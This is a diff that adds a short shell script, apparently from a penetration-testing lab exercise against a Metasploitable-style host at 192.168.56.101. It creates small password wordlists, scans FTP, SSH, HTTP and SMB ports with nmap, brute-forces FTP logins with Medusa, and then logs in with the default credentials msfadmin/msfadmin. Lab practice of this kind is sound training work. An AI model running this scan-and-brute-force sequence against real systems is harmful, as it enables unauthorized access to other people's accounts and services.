@@ -1,0 +1,16 @@
+
+
+# Criação das wordlists
+echo -e "123456\npassword\nqwerty\nmsfadmin" > wordlists/users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > wordlists/pass.txt
+
+# Varredura de serviços com Nmap
+nmap -p 21,22,80,445,139 192.168.56.101
+
+# Ataque de força bruta com Medusa no FTP
+medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6
+
+# Validação de acesso via FTP (manual)
+ftp 192.168.56.101
+# Usuário: msfadmin
+# Senha: msfadmin
